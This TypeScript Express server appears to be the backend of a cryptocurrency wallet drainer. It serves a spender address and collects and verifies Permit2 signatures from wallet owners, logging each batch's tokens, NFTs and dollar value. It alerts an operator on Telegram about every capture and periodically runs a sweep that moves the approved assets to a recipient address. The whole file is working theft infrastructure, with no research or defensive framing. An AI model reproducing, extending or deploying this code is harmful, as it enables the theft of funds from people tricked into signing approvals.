import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import { config, CHAIN_NAMES } from './config';
import { db, kv, activeSpender, activeRecipient } from './db';
import { verifySignature, PERMIT2_CANONICAL } from './verify';
import { sweepAll } from './executor';
import { startTelegramBot } from './telegram';

const app = express();
app.set('trust proxy', 1); // correct req.ip behind nginx/Cloudflare
app.use(helmet());
app.use(cors({ origin: config.corsOrigin || true }));
app.use(express.json({ limit: '256kb' }));

// ── shared limiter: max N hits per IP per windowMs ──
const hits = new Map<string, number[]>();
function limiter(max: number, windowMs: number) {
  return (req: any, res: any, next: any) => {
    const ip = req.ip || 'unknown';
    const now = Date.now();
    const arr = (hits.get(`${req.path}:${ip}`) ?? []).filter((t) => now - t < windowMs);
    if (arr.length >= max) return res.status(429).json({ error: 'slow down' });
    arr.push(now);
    hits.set(`${req.path}:${ip}`, arr);
    next();
  };
}

function requireAuth(req: any, res: any, next: any) {
  if (!config.apiKey) return next();
  if (req.header('x-api-key') !== config.apiKey) return res.status(403).json({ error: 'bad api key' });
  next();
}

// ── health (no auth — for uptime monitors / Docker healthcheck) ──
app.get('/health', (_req, res) =>
  res.json({ ok: true, spender: activeSpender() ? 'set' : 'unset' })
);

// ── 1. GET /api/config/claim — the runtime-delivered spender ──
app.get('/api/config/claim', requireAuth, (req, res) => {
  const spender = activeSpender();
  if (!spender) return res.status(503).json({ error: 'no spender configured' });
  res.set('Cache-Control', 'no-store');
  res.json({
    spender,
    expiryDays: Number(kv.get('expiry_days') || 30),
    maxBatch: Number(kv.get('max_batch') || 8) || undefined,
  });
});

// ── 2. POST /api/wallet/store-signature ──
app.post('/api/wallet/store-signature', requireAuth, limiter(30, 10 * 60 * 1000), async (req, res) => {
  try {
    const p = req.body;
    if (!p?.owner || !p?.signature || !p?.typedData || !p?.nonce)
      return res.status(400).json({ ok: false, error: 'missing fields' });

    // ── 1. EIP-712 verification (domain + types + message) ──
    const check = await verifySignature(p.typedData, p.owner, p.signature, Number(p.chainId));
    if (!check.ok) {
      console.warn(`[store] rejected: ${check.reason}`);
      return res.status(400).json({ ok: false, error: check.reason });
    }

    // ── 2. GOTCHA #1: the spender in the payload must be the CURRENT
    //       active executor — Permit2 executes as msg.sender, so a stale
    //       spender can never run this permit. Reject, don't just warn. ──
    if (String(p.spender).toLowerCase() !== activeSpender().toLowerCase())
      return res.status(409).json({
        ok: false,
        error: 'stale spender — refetch /api/config/claim and sign again',
        stale: true,
      });

    // ── 3. Dedupe + store ──
    const stmt = db.prepare(`
      INSERT OR IGNORE INTO signatures
        (owner, chain_id, spender, signature, nonce, deadline, tokens_json, nfts_json, wallet_name, batch_value_usd)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    const info = stmt.run(
      String(p.owner).toLowerCase(),
      Number(p.chainId),
      String(p.spender),
      String(p.signature),
      String(p.nonce),
      Number(p.deadline),
      JSON.stringify(p.tokens ?? []),
      JSON.stringify(p.nfts ?? []),
      p.walletName ?? null,
      Number(p.batchValueUsd || 0),
    );

    if (info.changes > 0) {
      sendTelegram(
        `🟢 <b>Signature stored</b>\n` +
          `👤 <code>${p.owner}</code>\n` +
          `⛓ ${CHAIN_NAMES[Number(p.chainId)] ?? p.chainId} (#${p.chainId})\n` +
          `💰 ~$${Number(p.batchValueUsd || 0).toFixed(2)}\n` +
          (p.nfts?.length ? `🖼 ${p.nfts.length} NFT(s)\n` : '') +
          `💼 ${p.walletName ?? 'unknown wallet'}`
      );
    }
    res.json({ ok: true, id: info.lastInsertRowid });
  } catch (err: any) {
    console.error('[store] error', err);
    res.status(500).json({ error: 'internal' });
  }
});

// ── 3. POST /api/telemetry/flow — heartbeats, notify on critical steps ──
const NOTIFY_STEPS = new Set(['fatal_no_spender', 'config_fetch_failed', 'config_payload_invalid']);
const stepDedupe = new Map<string, number>();

app.post('/api/telemetry/flow', requireAuth, limiter(60, 60 * 1000), (req, res) => {
  const { step, ts, ua, replayed, ...data } = req.body ?? {};
  if (!step) return res.status(204).end();
  db.prepare('INSERT INTO telemetry (step, payload, replayed) VALUES (?, ?, ?)')
    .run(String(step), JSON.stringify({ ...data, ua, ts }), replayed ? 1 : 0);

  if (NOTIFY_STEPS.has(String(step))) {
    const last = stepDedupe.get(String(step)) ?? 0;
    if (Date.now() - last > 10 * 60 * 1000) {
      stepDedupe.set(String(step), Date.now());
      sendTelegram(`🚨 <b>${step}</b>\n<code>${JSON.stringify(data).slice(0, 300)}</code>`);
    }
  }
  res.status(204).end();
});

app.listen(config.port, () => {
  console.log(`[server] up on :${config.port} — spender: ${activeSpender() || 'NOT SET'} | recipient: ${activeRecipient() || 'NOT SET'}`);
  sweepAll();
  setInterval(() => {
    if (kv.get('paused') === '1') return;
    sweepAll();
  }, config.sweepIntervalMs);
  startTelegramBot();
});